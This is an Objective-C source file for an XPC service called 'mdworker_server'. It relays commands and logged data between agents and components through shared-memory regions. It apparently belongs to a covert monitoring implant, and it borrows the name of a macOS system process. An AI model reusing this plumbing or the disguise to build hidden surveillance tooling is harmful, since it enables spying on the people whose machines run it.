//
//  main.c
//  mdworker_server
//
//  Created by kiodo on 24/10/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//
#import <Foundation/Foundation.h>
#import <xpc/xpc.h>
#import <sys/ipc.h>
#import <signal.h>

#import "RCSMCommon.h"
#import "RCSMSharedMemory.h"

//#define DEBUG_XPC

int gMemLogMaxSize     = 0x302460;
int gMemCommandMaxSize = 0x4000;
RCSMSharedMemory *gSharedMemoryCommand = nil;
RCSMSharedMemory *gSharedMemoryLogging = nil;

static BOOL initSharedMemory()
{
  //
  // Initialize and attach to our Shared Memory regions
  //  
  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
  key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
  
  gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
  
  gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
                                                          size: gMemCommandMaxSize
                                                 semaphoreName: SHMEM_SEM_NAME];
  
  if (gSharedMemoryCommand && [gSharedMemoryCommand createMemoryRegion] == -1)
    {
#ifdef DEBUG_XPC
      NSLog(@"%s: Error while creating shared memory for commands", __func__);
#endif

      [gSharedMemoryCommand release];

      return NO;
    }
  
  gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
                                                          size: gMemLogMaxSize
                                                 semaphoreName: SHMEM_SEM_NAME];
  
  if (gSharedMemoryLogging && [gSharedMemoryLogging createMemoryRegion] == -1)
    {
#ifdef DEBUG_XPC
      NSLog(@"%s: Error while creating shared memory for logging", __FUNCTION__);
#endif

      [gSharedMemoryCommand release];
      [gSharedMemoryLogging release];

      return NO;
    }
  
  //
  // Now it's safe to attach
  //
  [gSharedMemoryCommand attachToMemoryRegion];
  [gSharedMemoryLogging attachToMemoryRegion];
  
  return YES;
}

static void mdworker_server_peer_event_handler(xpc_connection_t peer, xpc_object_t event) 
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  xpc_object_t reply = NULL;
	xpc_type_t type = xpc_get_type(event);
  
  shMemoryCommand nullCmd;
  
  memset(&nullCmd, 0, sizeof(nullCmd));
  
  if (type == XPC_TYPE_ERROR) 
    {
      if (event == XPC_ERROR_CONNECTION_INVALID) 
        {

        } 
      else if (event == XPC_ERROR_TERMINATION_IMMINENT) 
        {

        }
    } 
  else if (type == XPC_TYPE_DICTIONARY)
    {
      int64_t cmd = xpc_dictionary_get_int64(event, "command");

      switch (cmd) 
        {
        // Read from shared mem
        case READ_XPC_CMD:
          {
            uint32 anOffset   = (uint32)xpc_dictionary_get_int64(event, "offset");
            uint32 aComponent = (uint32)xpc_dictionary_get_int64(event, "component"); 

            NSMutableData *replyData = [gSharedMemoryCommand readMemory:anOffset 
                                                          fromComponent:aComponent];

            if (replyData == nil || (replyData && [replyData length] == 0)) 
              replyData = [NSMutableData dataWithBytes: &nullCmd 
                                                length: sizeof(nullCmd)];

            reply = xpc_dictionary_create_reply(event);
            xpc_object_t data = xpc_data_create([replyData bytes], [replyData length]);

            if (reply != NULL && data != NULL) 
              xpc_dictionary_set_value(reply, "data", data);
            else
              {
                if (reply)
                  {
                    xpc_release(reply);
                    reply = NULL;
                  }
              }
          }  
          break;
        case READ_XPC_COMP_CMD:
          {     
            uint32 aComponent     = (uint32)xpc_dictionary_get_int64(event, "component"); 
            uint32 anAgentID      = (uint32)xpc_dictionary_get_int64(event, "agent");
            uint32 aCommandType   = (uint32)xpc_dictionary_get_int64(event, "type");

            NSMutableData *replyData = [gSharedMemoryLogging readMemoryFromComponent: aComponent 
                                                                            forAgent: anAgentID 
                                                                     withCommandType: aCommandType];

            if (replyData == nil || (replyData && [replyData length] == 0)) 
              replyData = [NSMutableData dataWithBytes: &nullCmd 
                                                length: sizeof(nullCmd)];

            reply = xpc_dictionary_create_reply(event);
            xpc_object_t data = xpc_data_create([replyData bytes], [replyData length]);

            if (reply != NULL && data != NULL) 
              xpc_dictionary_set_value(reply, "data", data);
            else
              {
                if (reply)
                  {
                    xpc_release(reply);
                    reply = NULL;
                  }
              }
          }  
        break;
          // Write to shared mem
        case WRITE_XPC_CMD:
          {
            size_t len = 0;
            BOOL ret = FALSE;

            uint32 anOffset   = (uint32)xpc_dictionary_get_int64(event, "offset");
            uint32 aComponent = (uint32)xpc_dictionary_get_int64(event, "component");
            void   *dataBytes = (void*)xpc_dictionary_get_data(event, "data", &len);

            if (dataBytes != NULL && len) 
              {
                NSData *aData = [NSData dataWithBytes: dataBytes length: len]; 

                ret = [gSharedMemoryLogging writeMemory:aData
                                                 offset:anOffset
                                          fromComponent:aComponent];
              }

            reply = xpc_dictionary_create_reply(event);

            xpc_object_t data = xpc_data_create(&ret, sizeof(ret));

            if (reply != NULL && data != NULL) 
              {
                xpc_dictionary_set_value(reply, "data", data);
              }
            else
              {
                if (reply)
                  {
                    xpc_release(reply);
                    reply = NULL;
                  }
              }
          }
        break;
        }

      if (reply != NULL && peer != NULL) 
        {
          xpc_connection_send_message(peer, reply);
          xpc_release(reply);
        }
    }
  
  [pool release];
}

static void mdworker_server_event_handler(xpc_connection_t peer) 
{
	xpc_connection_set_event_handler(peer, ^(xpc_object_t event) 
                                   {
                                     mdworker_server_peer_event_handler(peer, event);
                                   });
  
	xpc_connection_resume(peer);
}

static void killingService()
{
#ifdef DEBUG_XPC
  NSLog(@"%s: killing xpc service", __FUNCTION__);
#endif
  
  if (gSharedMemoryCommand)
    {
      [gSharedMemoryCommand detachFromMemoryRegion];
      [gSharedMemoryCommand release];
      gSharedMemoryCommand = nil;
    }
  
  if (gSharedMemoryLogging) 
    {
      [gSharedMemoryLogging detachFromMemoryRegion];
      [gSharedMemoryLogging release];
      gSharedMemoryLogging = nil;
    }
}

int main(int argc, const char *argv[])
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_XPC
  NSLog(@"%s: enter xpc service", __FUNCTION__);
#endif
  
  // deallocating shared...
  signal(SIGTERM, killingService);
  
  if (initSharedMemory() == NO)
    {
#ifdef DEBUG_XPC
      NSLog(@"%s:error creating  shared mem", __func__);
#endif

      [pool release];

      return 0;
    }
  
	xpc_main(mdworker_server_event_handler);
  
  [pool release];
  
	return 0;
}
